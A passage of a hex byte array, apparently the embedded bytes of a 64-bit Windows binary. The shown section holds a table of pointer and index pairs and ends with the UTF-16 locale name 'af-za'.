0x0, 0x0, 0x70, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x44, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x44, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x44, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xcd, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x44, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xac, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x44, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x92, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xba, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xdd, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xca, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x45, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xad, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xdf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x93, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xce, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xdb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xde, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x23, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x26, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x68, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x46, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x94, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xae, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xbc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x88, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x37, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xaf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x28, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x47, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x95, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x51, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x52, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x31, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x78, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x82, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x11, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x89, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x53, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x25, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x67, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x66, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x83, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x48, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x86, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x77, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x55, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x12, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x96, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x54, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x97, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x13, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x36, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x56, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x15, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x57, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x98, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x49, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x16, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x58, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x17, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x59, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x85, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x76, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x19, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x22, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x64, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xbe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xcb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x34, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x4a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xbd, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x99, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x33, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x38, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x39, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x81, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x35, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x62, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x60, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x34, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x90, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xaa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x46, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x70, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x66, 0x0, 0x2d, 0x0, 0x7a, 0x0, 0x61, 0x0, 